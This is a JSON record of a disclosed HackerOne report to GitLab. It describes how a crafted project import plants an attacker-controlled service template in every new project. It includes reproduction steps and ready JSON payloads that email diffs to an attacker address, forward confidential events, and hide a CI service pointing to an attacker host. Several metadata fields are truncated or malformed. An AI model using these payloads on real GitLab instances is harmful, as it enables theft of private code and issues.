{
  "reported_to": "GitLab",
  "reported_by": "jobert ",
  "title": "Exfiltrate and mutate repository and project data through injected templated service",
  "content": "\nThe GitLab import feature contains a vulnerability that allows an attacker to import a project that creates a service template. Service templates can normally only be created by a GitLab instance Administrator. When a new project is created, service templates are automatically initialized for the project that is being created. Initializing and saving the service templates is handled in the Projects::CreateService class:\napp/services/projects/create_service.rb\nCode 219 Bytes\n1# ...\n2def create_services_from_active_templates(project)\n3  Service.where(template: true, active: true).each do |template|\n4    service = Service.build_from_template(project.id, template)\n5    service.save!\n6  end\n7end\n8# ...\nThis means that when an attacker has created a templated service that is valid, any project created after that, will automatically install the attacker's service for that project. There are multiple attacks possible with this, which will be described in the Impact section of this report. Depending on the strategy the attacker takes, it may impact Confidentiality, Integrity, as well as Availability.\nProof of concept\nAttached you can find a tar file that injects a MockCiService as template to the GitLab instance: service_template.tar.gz (F377180). In order to manually reproduce this, follow the steps below.\nSign in as any user\nCreate a new project\nEnable the CI service through Settings > Integrations\nExport the project and download the export file\nExtract the files, it'll contain a project.json file\nReplace \"template\":false in the services array with \"template\":true\nReplace CiService in the services array with MockCiService\nCreate a new tar file (tar -zcvf service_template.tar.gz project.json VERSION project.bundle)\nUpload the tar file\nSign in as another user\nCreate another project\nImmediately export the project and download the export file\nExtract the files\nObserve that the project.json file will contain the service created for the other project\nAdditional, seemingly, less severe issues\nWhen looking into this feature, it was also observed that an attacker can create custom attributes for a project. I noticed that custom project attributes can only be created by an instance Administrator. However, by specifying custom attributes in the custom_attributes array, a user can create custom project attributes for the project that is being created. Depending on how the custom attributes are used on the instance, this may have additional consequences.\nImpact\nAn attacker can decide on what strategy to take with this vulnerability. The most interesting ones that I could find are described below.\nExfiltrating repository event\nThe EmailsOnPushService has the option to include a commit diff in an email. When the JSON below is added to the project.json file, any commit's diff will be emailed to the attacker.\nCode 702 Bytes\n1{\n2  \"id\": 41858507,\n3  \"title\": \"Email\",\n4  \"project_id\": 9465078,\n5  \"created_at\": \"2018-11-18T01:22:06.990Z\",\n6  \"updated_at\": \"2018-11-18T01:22:06.990Z\",\n7  \"active\": true,\n8  \"properties\": {\n9    \"send_from_committer_email\": false,\n10    \"disable_diffs\": false,\n11    \"recipients\": \"attacker@domain.tld\"\n12  },\n13  \"template\": true,\n14  \"push_events\": true,\n15  \"issues_events\": true,\n16  \"merge_requests_events\": true,\n17  \"tag_push_events\": true,\n18  \"note_events\": true,\n19  \"category\": \"ci\",\n20  \"default\": false,\n21  \"wiki_page_events\": true,\n22  \"pipeline_events\": true,\n23  \"confidential_issues_events\": true,\n24  \"commit_events\": true,\n25  \"job_events\": true,\n26  \"confidential_note_events\": true,\n27  \"type\": \"EmailsOnPushService\"\n28}\nExfiltrating (confidential) issues, merge requests, pipelines, etc.\nThe HipChat service, similar to Slack, is a service that responds to all events a project can trigger. Creating a template for this service will automatically send all new issues, notes, merge requests, pipeline updates, and pushes to a HipChat server. Below is the JSON object to inject a HipChat service template.\nCode 702 Bytes\n1{\n2  \"id\": 41858507,\n3  \"title\": \"HipChat\",\n4  \"project_id\": 9465078,\n5  \"created_at\": \"2018-11-18T01:22:06.990Z\",\n6  \"updated_at\": \"2018-11-18T01:22:06.990Z\",\n7  \"active\": true,\n8  \"properties\": {\n9    \"token\": \"some_token\",\n10    \"room\": \"room\",\n11    \"server\": \"\",\n12    \"color\": \"red\",\n13    \"api_version\": \"\"\n14  },\n15  \"template\": true,\n16  \"push_events\": true,\n17  \"issues_events\": true,\n18  \"merge_requests_events\": true,\n19  \"tag_push_events\": true,\n20  \"note_events\": true,\n21  \"category\": \"common\",\n22  \"default\": false,\n23  \"wiki_page_events\": true,\n24  \"pipeline_events\": true,\n25  \"confidential_issues_events\": true,\n26  \"commit_events\": true,\n27  \"job_events\": true,\n28  \"confidential_note_events\": true,\n29  \"type\": \"HipchatService\"\n30}\nHidden services\nAn attacker can leverage the MockCiService to inject a service that is not visible in the UI. The only mock service that interacts with an actual service is the MockCiService. The other two, MockDeploymentService and MockMonitoringService, do not interact with an external URL.\nCode 697 Bytes\n1{\n2  \"id\": 41858507,\n3  \"title\": \"MockCI\",\n4  \"project_id\": 9465078,\n5  \"created_at\": \"2018-11-18T01:22:06.990Z\",\n6  \"updated_at\": \"2018-11-18T01:22:06.990Z\",\n7  \"active\": true,\n8  \"properties\": {\n9    \"mock_service_url\": \"https://attacker_host/\",\n10    \"multiproject_enabled\": \"1\",\n11    \"pass_unstable\": \"0\"\n12  },\n13  \"template\": true,\n14  \"push_events\": true,\n15  \"issues_events\": true,\n16  \"merge_requests_events\": true,\n17  \"tag_push_events\": true,\n18  \"note_events\": true,\n19  \"category\": \"ci\",\n20  \"default\": false,\n21  \"wiki_page_events\": true,\n22  \"pipeline_events\": true,\n23  \"confidential_issues_events\": true,\n24  \"commit_events\": true,\n25  \"job_events\": true,\n26  \"confidential_note_events\": true,\n27  \"type\": \"MockCiService\"\n28}\nUnconfirmed: Mutating data\nThe Slack service / integration allows a user to also interact with objects in a project. Because an attacker can force a weak token in the service template, it can then send an API request to the GitLab API to interact with the project. This could not be confirmed because I did not feel comfortable creating a Slack template on gitlab.com and I was not able to set up the Slack integration on my own GitLab instance. However, I was able to confirm that I was able to create this service on my own GitLab instance with a weak token (a). JSON below.\nCode 621 Bytes\n1{\n2  \"id\": 41858507,\n3  \"title\": \"Slack\",\n4  \"project_id\": 9465078,\n5  \"created_at\": \"2018-11-18T01:22:06.990Z\",\n6  \"updated_at\": \"2018-11-18T01:22:06.990Z\",\n7  \"active\": true,\n8  \"properties\": {\n9    \"token\": \"a\"\n10  },\n11  \"template\": true,\n12  \"push_events\": true,\n13  \"issues_events\": true,\n14  \"merge_requests_events\": true,\n15  \"tag_push_events\": true,\n16  \"note_events\": true,\n17  \"category\": \"common\",\n18  \"default\": false,\n19  \"wiki_page_events\": true,\n20  \"pipeline_events\": true,\n21  \"confidential_issues_events\": true,\n22  \"commit_events\": true,\n23  \"job_events\": true,\n24  \"confidential_note_events\": true,\n25  \"type\": \"SlackSlashCommandsService\"\n26}\nExternal services\nThe two other services that had an interesting side effect were the ExternalWikiService and CustomIssueTrackerService. Both of them can be used to overwrite a project's Issue and Wiki URL in their project. This may be used to social engineer users into creating issues on a domain that is controlled by the attacker.\n\n",
  "severity": "[",
  "bounty": 11000,
  "weaknesses": "[",
  "screenshots": {},
  "disclosed_date": 1551762540,
  "report_url": "https://hackerone.com/reports/446585",
  "is_multi_component": true,
  "complexity": "MEDIUM",
  "novelty": "MEDIUM",
  "vuln_category": "WEB_APP",
  "steps": "[",
  "Extract the project.json file from the export, modify 'template'": "false to 'template':true and replace 'CiService' with 'MockCiService'.",
  "vuln_description": "The vulnerability allows an attacker to inject a malicious service template into GitLab's import feature, which then gets automatically applied to all newly created projects. This can lead to data exfiltration, hidden services, or potential data mutation depending on the service template used.",
  "reason": "The attack requires understanding of GitLab's service template system, project import/export functionality, and the specific JSON structure needed to create a malicious template. The interaction between project creation and automatic service template application is non-obvious.",
  "new_complexity": "HIGH",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "idor_detectable": true,
  "authnz_byppass_detectable": true,
  "injection_classification": "}"
}